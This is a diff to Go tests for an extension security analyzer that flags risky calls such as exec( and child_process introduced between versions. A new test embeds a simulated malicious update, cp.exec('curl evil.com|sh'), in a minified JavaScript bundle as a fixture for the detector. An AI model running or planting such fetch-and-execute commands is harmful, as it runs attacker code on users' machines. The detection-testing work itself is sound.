@@ -1,6 +1,7 @@
 package analyzer
 
 import (
+	"strings"
 	"testing"
 
 	"github.com/dymchenkko/extwatch/internal/extension"
@@ -22,11 +23,11 @@ func TestAnalyzeDiff(t *testing.T) {
 	if names["process.env"] {
 		t.Error("process.env pre-existed in old version; should not be introduced")
 	}
-	if !names["child_process"] || !names["exec("] {
-		t.Errorf("expected child_process and exec( introduced, got %v", names)
+	if !names["exec("] {
+		t.Errorf("expected exec( introduced, got %v", names)
 	}
 	if !res.HasHigh() {
-		t.Error("expected HasHigh=true (child_process/exec are HIGH)")
+		t.Error("expected HasHigh=true (exec is HIGH)")
 	}
 }
 
@@ -111,6 +112,37 @@ func TestAnalyzeManifest(t *testing.T) {
 	}
 	if names["compile script"] {
 		t.Error("compile is not a lifecycle script; must not flag")
+	}
+}
+
+func TestAnalyzeMinifiedDiff(t *testing.T) {
+	// Simulate a minified bundle (one line > maxDiffLineLen) that already calls
+	// exec('safe-build-step'). The new version adds exec('curl evil.com|sh') to
+	// the same bundle line. Only the new call must be introduced; the existing
+	// safe call must be suppressed even though the surrounding mega-line changed.
+	padding := strings.Repeat("var x=1;", 50) // 400 chars — pushes line past 300
+	oldBundle := padding + "var cp=require('child_process');cp.exec('safe-build-step');"
+	newBundle := padding + "var cp=require('child_process');cp.exec('safe-build-step');cp.exec('curl evil.com|sh');"
+
+	res := Analyze(
+		extension.Extension{Publisher: "p", Name: "n", Version: "2.0.0"},
+		"1.0.0",
+		map[string]string{"bundle.js": newBundle},
+		map[string]string{"bundle.js": oldBundle},
+		"", "",
+	)
+
+	var execFindings []Finding
+	for _, f := range res.Introduced {
+		if f.Pattern.Name == "exec(" {
+			execFindings = append(execFindings, f)
+		}
+	}
+	if len(execFindings) != 1 {
+		t.Fatalf("want exactly 1 introduced exec( (the evil one), got %d: %v", len(execFindings), execFindings)
+	}
+	if execFindings[0].Arg != "curl evil.com|sh" {
+		t.Errorf("introduced exec( should carry the evil arg, got %q", execFindings[0].Arg)
 	}
 }
 
